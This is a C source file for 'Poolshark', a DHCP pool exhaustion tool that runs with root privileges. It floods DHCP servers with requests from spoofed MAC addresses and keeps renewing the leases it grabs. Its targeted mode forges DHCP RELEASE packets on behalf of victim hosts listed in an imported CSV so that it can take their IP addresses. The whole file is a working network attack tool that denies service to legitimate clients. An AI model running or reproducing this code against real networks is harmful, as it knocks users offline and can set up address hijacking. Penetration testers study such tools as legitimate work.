#ifdef __INTELLISENSE__
#pragma diag_suppress 70
#endif

#include <stdio.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <ifaddrs.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <getopt.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/time.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>

#include "../common/net.h"
#include "../common/dhcp.h"

#define BUFFER_SIZE 65535
#define MAX_LINE_LEN 2048
#define TIMEOUT 20

/* IPv4 header structure following RFC 791 */
typedef struct IP
{
    uint8_t version_ihl;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t flags_offset;
    uint8_t ttl;
    uint8_t proto;
    uint16_t checksum;
    uint8_t src_ip[4];
    uint8_t dst_ip[4];
} __attribute__((packed)) IP;

/* UDP header structure following RFC 768 */
typedef struct UDP
{
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t len;
    uint16_t checksum;
} __attribute__((packed)) UDP;

/* Complete packet structure from Layer 2-7 */
typedef struct Packet
{
    EthHeader eth;
    IP ip;
    UDP udp;
    DHCP dhcp;
} __attribute__((packed)) Packet;

/* Tracks exhausted IPs for lease renewal */
typedef struct Exausted
{
    uint8_t ip[4];
    uint8_t mac[16];
    uint32_t lease_time;
    time_t timestamp_inserted;
    uint8_t dhcp_host[4];
    uint8_t dhcp_mac[6];
    struct Exausted *next;
} Exausted;

/* Stores target IPs from Cardshark CSV import */
typedef struct Targets
{
    uint8_t ip_addr[4];
    uint8_t mac[6];
    struct Targets *next;
} Targets;

/* Global state */
volatile sig_atomic_t keep_running = 1;
uint8_t dhcp_host[4];
int sock;
Exausted *head = NULL;
int ifindex = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t node_lock = PTHREAD_MUTEX_INITIALIZER;

void print_usage(const char *progname);
void spoof_mac(uint8_t *mac);
void rand_transaction_id(uint8_t *id);
void calc_ip_checksum(Packet *p);
int netmask_to_cidr(unsigned long netmask);
void exaust_pool(int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname);
void stop(int sig);
void cleanup(Packet *p, Exausted *head);
void release_target(FILE *fp, Packet *p, uint8_t *iface_ip, int ifindex);
void release_on_exit(Packet *p, Exausted *head, int ifindex);
int wait_for_response(unsigned char *buffer, uint8_t *transaction_id, int timout, int sock);
Packet *init_packet(void);
void *renew_leases(void *arg);
void get_lease_time(Packet *offer, Exausted *new_node);

/**
 * Initialize socket address structure
 * @param send_addr - Address structure to initialize
 * @param ifindex - Network interface index
 * @param dst_mac - Destination MAC (NULL for broadcast)
 */
void init_sock(struct sockaddr_ll *send_addr, int ifindex, const uint8_t *dst_mac);

/**
 * Thread-safe packet send wrapper
 * @param sock - Socket file descriptor
 * @param p - Packet to send
 * @param addr - Destination address
 * @return Bytes sent or -1 on error
 */
int safe_send(int sock, Packet *p, struct sockaddr_ll *addr);

int main(int argc, char *argv[])
{
    printf("Poolshark - DHCP Pool Exhaustion Tool\n");

    signal(SIGINT, stop);
    char *iface = NULL;
    char *import_file = NULL;
    int opt;
    int delay = 0;
    FILE *fp = NULL;
    const char *hostname = "pwn3d-poolshark";
    int mode = 0;

    if (getuid() != 0)
    {
        fprintf(stderr, "Error: Poolshark requires root privileges\n");
        fprintf(stderr, "Try: sudo %s -i <interface>\n", argv[0]);
        return 1;
    }

    /* Parse command line arguments */
    while ((opt = getopt(argc, argv, "i:d:f:n:h")) != -1)
    {
        switch (opt)
        {
        case 'i':
            iface = optarg;
            break;
        case 'h':
            print_usage(argv[0]);
            exit(EXIT_SUCCESS);
        case 'd':
            delay = atoi(optarg);
            break;
        case 'f':
            import_file = optarg;
            break;
        case 'n':
            hostname = (const char*)optarg;
            break;
        }
    }

    if (!iface)
    {
        fprintf(stderr, "Error: Interface is required\n\n");
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (import_file)
    {
        fp = fopen(import_file, "r");
        if (!fp)
        {
            perror("fopen");
            return 1;
        }
        mode = 1;
    }

    Packet *p = init_packet();
    struct ifreq ifr;
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (!p)
    {
        perror("malloc");
        return 1;
    }
    if (sock < 0)
    {
        perror("socket");
        return 1;
    }

    srand(time(NULL));

    /* Get interface information */
    struct sockaddr_in *iaddr = (struct sockaddr_in *)&ifr.ifr_netmask;
    //memcpy(ifr.ifr_name, iface, sizeof(iface));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ifindex = if_nametoindex(ifr.ifr_name);

    if (ifindex == 0)
    {
        perror("if_nametoindex");
        return 1;
    }

    /* Calculate pool size from netmask */
    if (ioctl(sock, SIOCGIFNETMASK, &ifr) < 0)
    {
        perror("ioctl");
        return 1;
    }
    int cidr = netmask_to_cidr(iaddr->sin_addr.s_addr);
    int num_of_ips = (1 << (32 - cidr)) - 2;

    /* Get interface IP address */
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl");
        return 1;
    }
    iaddr = (struct sockaddr_in *)&ifr.ifr_addr;
    uint8_t iface_ip[4];
    memcpy(iface_ip, &iaddr->sin_addr.s_addr, 4);

    char iface_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, iface_ip, iface_ip_str, INET_ADDRSTRLEN);

    printf("Interface: %s\n", iface);
    printf("IP Address: %s\n", iface_ip_str);
    printf("Number of IP's: %d\n", num_of_ips);

    /* Run targeted or normal attack mode */
    if (mode)
    {
        printf("Attack Mode: Targeted\n");
        release_target(fp, p, iface_ip, ifindex);
    }
    else
    {
        printf("Attack Mode: Normal\n");
    }
    
    /* Start lease renewal thread and begin exhaustion */
    pthread_t thread;
    int thread_id = 1;
    if(keep_running)
    {
        if(pthread_create(&thread, NULL, renew_leases, &thread_id) != 0)
        {
            perror("pthread_create");
            return 1;
        }
        exaust_pool(ifindex, p, &head, num_of_ips, 0, hostname);
    }
    pthread_join(thread, NULL);
    release_on_exit(p, head, ifindex);
    cleanup(p, head);
}

void spoof_mac(uint8_t *mac)
{
    for (int i = 0; i < 6; i++)
    {
        mac[i] = rand() % 256;
    }
    /* Set locally administered bit, clear multicast bit */
    mac[0] = (mac[0] & 0xfe) | 0x02;
}

void rand_transaction_id(uint8_t *id)
{
    uint32_t xid = htonl(((uint32_t)MAGIC_TAG << 16) | (rand() & 0x0000ffff));
    memcpy(id, &xid, 4);
}

void calc_ip_checksum(Packet *p)
{
    p->ip.checksum = 0;
    uint32_t sum = 0;
    uint16_t word;
    int ip_header_len = sizeof(p->ip);

    /* Sum all 16-bit words */
    for (int i = 0; i < ip_header_len / 2; i++)
    {
        memcpy(&word, (uint8_t *)&p->ip + (i * 2), sizeof(uint16_t));
        sum += ntohs(word);
    }

    /* Fold carries into 16 bits */
    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    p->ip.checksum = htons(~sum & 0xffff);
}

int netmask_to_cidr(unsigned long netmask)
{
    return cidr_from_netmask((uint32_t)netmask);
}

void exaust_pool(int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname)
{
    unsigned char buffer[BUFFER_SIZE];
    int len = strlen(hostname);
    char offered_ip[16];
    int count = 0;
    int retries = 1;
    struct sockaddr_ll send_addr = {0};

    init_sock(&send_addr, ifindex, NULL);
    printf("Exhausting IP(s)...\n");
    printf("Press Ctrl+C to stop exhausting.\n\n");

    while (keep_running)
    {
        /* Build DHCP DISCOVER with random MAC */
        spoof_mac(p->eth.src_mac);
        memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
        rand_transaction_id(p->dhcp.transaction_id);
        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));

        int offset = 0;
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){1});
        p->dhcp.options[offset] = DHCP_OPTION_END;
        
        memset(p->ip.src_ip, 0, 4);
        memset(p->dhcp.client_ip, 0, sizeof(p->dhcp.client_ip));
        memset(p->ip.dst_ip, 0xff, sizeof(p->ip.dst_ip));
        calc_ip_checksum(p);

        int bytes_sent = safe_send(sock, p, &send_addr);
        if (bytes_sent < 0)
        {
            perror("sendto");
            keep_running = 0;
            return;
        }

        /* Wait for DHCP OFFER */
        if(wait_for_response(buffer, p->dhcp.transaction_id, TIMEOUT, sock) != 1)
        {
            if(retries > 5)
            {
                printf("[MAIN] No offer from host in 5 retries, host is likely fully exhausted\n");
                for(int i = 0; i < 60 && keep_running; i++)
                {
                    sleep(1);
                }
                retries = 1;
            }
            else
            {
                retries++;
                printf("[MAIN] No offer from host in %ds, retrying\n", TIMEOUT);
                sleep(2);
            }
            continue;
        }

        retries = 1;
        Packet *offer = (Packet *)buffer;
        snprintf(offered_ip, sizeof(offered_ip), "%d.%d.%d.%d",
                    offer->dhcp.ip_addr[0], offer->dhcp.ip_addr[1],
                    offer->dhcp.ip_addr[2], offer->dhcp.ip_addr[3]);

        /* Build DHCP REQUEST */
        offset = 0;
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){3});
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_REQUESTED_IP, 4, offer->dhcp.ip_addr);
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_SERVER_ID, 4, offer->ip.src_ip);
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_HOSTNAME, len, hostname);
        p->dhcp.options[offset++] = DHCP_OPTION_END;
        memset(&p->dhcp.options[offset], 0, 312 - offset);
        calc_ip_checksum(p);

        bytes_sent = safe_send(sock, p, &send_addr);
        if (bytes_sent < 0)
        {
            perror("sendto");
            keep_running = 0;
            return;
        }

        /* Wait for DHCP ACK */
        if(wait_for_response(buffer, p->dhcp.transaction_id, TIMEOUT, sock) != 1)
        {
            printf("[MAIN] No ACK from host in %ds, retrying...\n", TIMEOUT);
            continue;
        }

        /* Add to exhausted list */
        Exausted *new_node = malloc(sizeof(Exausted));
        if (!new_node)
        {
            perror("malloc");
            keep_running = 0;
            return;
        }
        count++;
        printf("[MAIN] #%d: Exhausted IP [%s]\n", count, offered_ip);

        memcpy(&new_node->ip, &offer->dhcp.ip_addr, sizeof(offer->dhcp.ip_addr));
        memcpy(&new_node->mac, &p->eth.src_mac, sizeof(p->eth.src_mac));
        memcpy(&new_node->dhcp_host, &offer->ip.src_ip, sizeof(offer->ip.src_ip));
        memcpy(&new_node->dhcp_mac, &offer->eth.src_mac, sizeof(offer->eth.src_mac));
        new_node->timestamp_inserted = time(NULL);
        get_lease_time(offer, new_node);

        pthread_mutex_lock(&node_lock);
        new_node->next = *head;
        *head = new_node;
        pthread_mutex_unlock(&node_lock);

        if(delay)
        {
            usleep(delay);
        }
    }
}

void print_usage(const char *progname)
{
    printf("Poolshark - DHCP Pool Exhaustion Tool\n\n");
    printf("Usage: sudo %s -i <interface> [-d][-f][-n][-h]\n", progname);
    printf("\n");
    printf("Required:\n");
    printf(" -i <interface>  Network interface to use (e.g., eth0, wlan0)\n");
    printf("\n");
    printf("Options:\n");
    printf(" -d <delay>      Delay between requests in milliseconds (default: 0)\n");
    printf(" -f <file>       Import Cardshark CSV to steal specific IPs first\n");
    printf(" -n <hostname>   Custom hostname for DHCP requests (default: pwn3d-poolshark)\n");
    printf(" -h              Display this help message\n");
    printf("\n");
    printf("Examples:\n");
    printf(" sudo %s -i eth0\n", progname);
    printf(" sudo %s -i wlan0 -d 1000\n", progname);
    printf(" sudo %s -i eth0 -f cardshark_scan.csv\n", progname);
    printf(" sudo %s -i eth0 -n h4ck3ed -d 500\n", progname);
    printf("\n");
    printf("Attack Modes:\n");
    printf(" Normal:   Exhausts entire DHCP pool with random MAC addresses\n");
    printf(" Targeted: Uses -f to steal specific IPs first, then exhausts remainder\n");
    printf("\n");
    printf("Press Ctrl+C to stop exhausting.\n");
}

void cleanup(Packet *p, Exausted *head)
{
    printf("Cleaning up... ");
    free(p);
    close(sock);
    printf(" [OK]\n");
}

void stop(int sig)
{
    keep_running = 0;
}

void release_target(FILE *fp, Packet *p, uint8_t *iface_ip, int ifindex)
{
    char buffer[MAX_LINE_LEN];
    char *token;
    Targets *head = NULL;
    int row_count = 0;
    unsigned char data[BUFFER_SIZE];
    struct sockaddr_ll send_addr = {0};

    init_sock(&send_addr, ifindex, NULL);
    fgets(buffer, MAX_LINE_LEN, fp);

    /* Parse Cardshark CSV into linked list */
    while (fgets(buffer, MAX_LINE_LEN, fp) != NULL)
    {
        Targets *new_node = malloc(sizeof(Targets));
        if (!new_node)
        {
            perror("malloc");
            return;
        }

        new_node->next = head;
        token = strtok(buffer, ",");
        int col = 0;

        while (token != NULL)
        {
            switch (col)
            {
            case 0:
                inet_pton(AF_INET, token, new_node->ip_addr);
                break;
            case 1:
                int a, b, c, d, e, f;
                if (sscanf(token, "%x:%x:%x:%x:%x:%x", &a, &b, &c, &d, &e, &f) == 6)
                {
                    new_node->mac[0] = (uint8_t)a;
                    new_node->mac[1] = (uint8_t)b;
                    new_node->mac[2] = (uint8_t)c;
                    new_node->mac[3] = (uint8_t)d;
                    new_node->mac[4] = (uint8_t)e;
                    new_node->mac[5] = (uint8_t)f;
                }
                else
                {
                    fprintf(stderr, "Error: Failed to parse Cardshark import\n");
                    free(new_node);
                    return;
                }
                break;
            }
            col++;
            token = strtok(NULL, ",");
        }
        head = new_node;
        row_count++;
    }
    fclose(fp);
    printf("Releasing %d IP(s)...\n", row_count);

    while(keep_running)
    {
        /* Send DHCP DISCOVER to find server */
        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
        memset(p->ip.src_ip, 0, 4);
        spoof_mac(p->eth.src_mac);
        memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac)); 
        rand_transaction_id(p->dhcp.transaction_id);

        int offset = 0;
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){1});
        p->dhcp.options[offset++] = DHCP_OPTION_END;
        calc_ip_checksum(p);

        int bytes_sent = safe_send(sock, p, &send_addr);
        if (bytes_sent < 0)
        {
            perror("sendto");
            return;
        }

        if(wait_for_response(data, p->dhcp.transaction_id, TIMEOUT, sock) != 1)
        {
            printf("[MAIN] No offer from host in %ds, retrying\n", TIMEOUT);
            continue;
        }

        Packet *offer = (struct Packet*)data;
        char dhcp_str[INET_ADDRSTRLEN];

        /* Extract DHCP server IP from options */
        uint8_t *server_id = find_dhcp_option(offer->dhcp.options, sizeof(offer->dhcp.options), DHCP_OPTION_SERVER_ID);
        if (server_id)
        {
            memcpy(dhcp_host, server_id, 4);
            inet_ntop(AF_INET, dhcp_host, dhcp_str, INET_ADDRSTRLEN);
        }

        Targets *current = head;

        /* Release each target IP */
        while (current != NULL && keep_running)
        {
            char ip_str[INET_ADDRSTRLEN];
            /* Skip our own IP and gateway */
            if(memcmp(&current->ip_addr, iface_ip, sizeof(current->ip_addr)) == 0 || 
               memcmp(&current->ip_addr, dhcp_host, sizeof(current->ip_addr)) == 0)
            {
                inet_ntop(AF_INET, current->ip_addr, ip_str, INET_ADDRSTRLEN);
                printf("Not releasing [%s] as this is our IP or our gateway\n", ip_str);
                current = current->next;
                continue;
            }

            /* Build DHCP RELEASE packet */
            p->dhcp.opcode = 1;
            memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
            memcpy(&p->dhcp.client_ip, &current->ip_addr, sizeof(current->ip_addr));
            memcpy(p->ip.dst_ip, dhcp_host, 4);
            memcpy(p->ip.src_ip, current->ip_addr, 4);
            memset(p->dhcp.options, 0, sizeof(p->dhcp.options));

            offset = 0;
            add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){7});
            add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_SERVER_ID, 4, &dhcp_host);
            p->dhcp.options[offset++] = DHCP_OPTION_END;
            calc_ip_checksum(p);

            bytes_sent = safe_send(sock, p, &send_addr);
            if (bytes_sent < 0)
            {
                perror("sendto");
                return;
            }

            inet_ntop(AF_INET, current->ip_addr, ip_str, INET_ADDRSTRLEN);
            Targets *tmp = current;
            current = current->next;
            free(tmp);
            printf("Released [%s]\n", ip_str);
        }
        break;
    }

    if(keep_running)
    {
        printf("Release complete, now running exhaustion...\n");
    }
}

void release_on_exit(Packet *p, Exausted *head, int ifindex)
{
    printf("\n\nReleasing all exhausted IP(s)...");
    Exausted *current = head;
    struct sockaddr_ll send_addr = {0};
    init_sock(&send_addr, ifindex, NULL);

    int offset = 0;

    while (current != NULL)
    {
        Exausted *tmp = current;
        p->dhcp.opcode = 1;
        memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
        memcpy(&p->dhcp.client_ip, &current->ip, sizeof(current->ip));
        memcpy(&p->ip.dst_ip, &current->dhcp_host, sizeof(current->dhcp_host));
        memcpy(&p->ip.src_ip, &current->ip, 4);
        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
        memcpy(&send_addr.sll_addr, &current->dhcp_mac, sizeof(current->dhcp_mac));

        offset = 0;
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){7});
        add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_SERVER_ID, 4, &current->dhcp_host);
        p->dhcp.options[offset++] = DHCP_OPTION_END;
        calc_ip_checksum(p);

        int bytes_sent = safe_send(sock, p, &send_addr);
        if (bytes_sent < 0)
        {
            perror("sendto");
            return;
        }
        current = current->next;
        free(tmp);
    }
    printf(" [OK]\n");
}

int wait_for_response(unsigned char *buffer, uint8_t *transaction_id, int timeout, int sock)
{
    struct sockaddr_ll recv_addr;
    socklen_t recv_addr_len = sizeof(recv_addr);
    time_t start_time = time(NULL);

    while(keep_running)
    {
        time_t elapsed_time = time(NULL) - start_time;
        if(elapsed_time >= timeout)
        {
            return 0;
        }

        /* Use select() for timeout */
        fd_set readfds;
        struct timeval tv;
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        tv.tv_sec = timeout - elapsed_time;
        tv.tv_usec = 0;

        int result = select(sock+1, &readfds, NULL, NULL, &tv);
        if(result == 0)
        {
            return 0;
        }
        if(result < 0)
        {
            return -1;
        }

        int received_bytes = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&recv_addr, &recv_addr_len);
        if(received_bytes < 0)
        {
            return -1;
        }

        if(received_bytes < (int)(offsetof(Packet, dhcp.transaction_id) + 4))
        {
            continue;
        }

        Packet *new_packet = (Packet *)buffer;

        /* Filter for matching DHCP response */
        if(new_packet->dhcp.opcode == 0x02 && memcmp(new_packet->dhcp.transaction_id, transaction_id, 4) == 0)
        {
            return 1;
        }
    }
    return 0;
}

Packet *init_packet(void)
{
    Packet *p = malloc(sizeof(Packet));
    if(!p)
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    /* Initialize Ethernet header */
    spoof_mac(p->eth.src_mac);
    memset(p->eth.dst_mac, 0xff, sizeof(p->eth.dst_mac));
    p->eth.eth_type = htons(0x0800);

    /* Initialize IP header */
    p->ip.version_ihl = 0x45;
    p->ip.tos = 0;
    p->ip.total_len = htons(20 + 8 + 552);
    p->ip.id = htons(0);
    p->ip.flags_offset = htons(0x4000);
    p->ip.ttl = 64;
    p->ip.proto = 17;
    p->ip.checksum = 0;
    memset(p->ip.src_ip, 0x00, sizeof(p->ip.src_ip));
    memset(p->ip.dst_ip, 0xff, sizeof(p->ip.dst_ip));

    /* Initialize UDP header */
    p->udp.src_port = htons(68);
    p->udp.dst_port = htons(67);
    p->udp.len = htons(8 + 552);
    p->udp.checksum = 0;

    /* Initialize DHCP header */
    p->dhcp.opcode = 1;
    p->dhcp.hw_type = 1;
    p->dhcp.hw_len = 6;
    p->dhcp.hops = 0;
    rand_transaction_id(p->dhcp.transaction_id);
    memset(p->dhcp.sec_elapsed, 0x00, sizeof(p->dhcp.sec_elapsed));
    memset(p->dhcp.flags, 0x00, sizeof(p->dhcp.flags));
    p->dhcp.flags[0] = 0x80;
    p->dhcp.flags[1] = 0x00;
    memset(p->dhcp.client_ip, 0x00, sizeof(p->dhcp.client_ip));
    memset(p->dhcp.server_ip, 0x00, sizeof(p->dhcp.server_ip));
    memset(p->dhcp.gtwy_ip, 0x00, sizeof(p->dhcp.gtwy_ip));
    memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
    memset(p->dhcp.server_name, 0x00, sizeof(p->dhcp.server_name));
    memset(p->dhcp.boot_file, 0x00, sizeof(p->dhcp.boot_file));
    memset(p->dhcp.ip_addr, 0x00, sizeof(p->dhcp.ip_addr));
    
    /* DHCP magic cookie */
    set_dhcp_magic_cookie(p->dhcp.magic_cookie);
    
    /* Default DHCP options */
    p->dhcp.options[0] = DHCP_OPTION_MESSAGE_TYPE;
    p->dhcp.options[1] = 1;
    p->dhcp.options[2] = 1;
    p->dhcp.options[3] = DHCP_OPTION_END;
    memset(&p->dhcp.options[4], 0x00, 308);
    
    calc_ip_checksum(p);
    return p;
}

void *renew_leases(void *arg)
{
    Packet *p = init_packet();
    char ip_str[INET_ADDRSTRLEN];
    unsigned char buffer[BUFFER_SIZE];
    
    int renewal_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(renewal_sock < 0)
    {
        perror("socket");
        keep_running = 0;
        return NULL;
    }
    
    
    while(keep_running)
    {
        pthread_mutex_lock(&node_lock);
        Exausted *current = head;
        pthread_mutex_unlock(&node_lock);
        rand_transaction_id(p->dhcp.transaction_id);

        while(current != NULL && keep_running)
        {
            usleep(50);
            p->dhcp.flags[0] = 0x80;
            p->dhcp.flags[1] = 0x00;
            memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
            memcpy(&p->dhcp.client_ip, &current->ip, sizeof(current->ip));
            memcpy(p->ip.dst_ip, current->dhcp_host, 4);
            memcpy(p->ip.src_ip, current->ip, 4);
            memcpy(p->eth.dst_mac, current->dhcp_mac, sizeof(current->dhcp_mac));
            memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
            inet_ntop(AF_INET, current->ip, ip_str, INET_ADDRSTRLEN);

            int offset = 0;

            /* Calculate time elapsed */
            time_t time_now = time(NULL);
            int half_lease = (current->lease_time) / 2;
            int elapsed = (int)difftime(time_now, current->timestamp_inserted);

            /* Only renew at T1 (50% lease time) per RFC 2131 */
            if(elapsed < half_lease)
            {
                current = current->next;
                continue;
            }

            p->dhcp.opcode = 1;

            /* Build DHCP REQUEST for renewal */
            add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){3});
            add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_REQUESTED_IP, 4, current->ip);
            add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_SERVER_ID, 4, current->dhcp_host);
            add_dhcp_option(p->dhcp.options, &offset, DHCP_OPTION_CLIENT_ID, 7, current->mac);
            p->dhcp.options[offset++] = DHCP_OPTION_END;
            calc_ip_checksum(p);

            struct sockaddr_ll send_addr = {0};
            init_sock(&send_addr, ifindex, current->dhcp_mac);
            printf("[RENEWAL_THREAD] Lease for %s expires soon, renewing lease...\n", ip_str);

            int bytes_sent = safe_send(sock, p, &send_addr);
            if(bytes_sent < 0)
            {
                perror("sendto");
                keep_running = 0;
                return NULL;
            }

            if(wait_for_response(buffer, p->dhcp.transaction_id, TIMEOUT, renewal_sock) != 1)
            {
                printf("[RENEWAL_THREAD] No response from host while trying to renew %s, will try again on next iteration...\n", ip_str);
                current = current->next;
                continue;
            }

            printf("[RENEWAL_THREAD] Renewed %s successfully\n", ip_str);
            pthread_mutex_lock(&node_lock);
            current->timestamp_inserted = time(NULL);
            current = current->next;
            pthread_mutex_unlock(&node_lock);
        }
    }
    free(p);
    return NULL;
}

void get_lease_time(Packet *offer, Exausted *new_node)
{
    uint8_t *lease_time = find_dhcp_option(offer->dhcp.options, sizeof(offer->dhcp.options), DHCP_OPTION_LEASE_TIME);
    if(lease_time)
    {
        memcpy(&new_node->lease_time, lease_time, sizeof(new_node->lease_time));
        new_node->lease_time = ntohl(new_node->lease_time);
    }
}

void init_sock(struct sockaddr_ll *send_addr, int ifindex, const uint8_t *dst_mac)
{
    memset(send_addr, 0, sizeof(*send_addr));
    send_addr->sll_family = AF_PACKET;
    send_addr->sll_ifindex = ifindex;
    send_addr->sll_halen = 6;

    if(dst_mac) 
    {
        memcpy(send_addr->sll_addr, dst_mac, 6);
    } 
    else
    {
        memset(send_addr->sll_addr, 0xff, 6);
    }
}

int safe_send(int sock, Packet *p, struct sockaddr_ll *addr)
{
    pthread_mutex_lock(&lock);
    int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)addr, sizeof(*addr));
    pthread_mutex_unlock(&lock);
    
    if (bytes_sent < 0) 
    {
        perror("sendto");
        return -1;
    }
    return bytes_sent;
}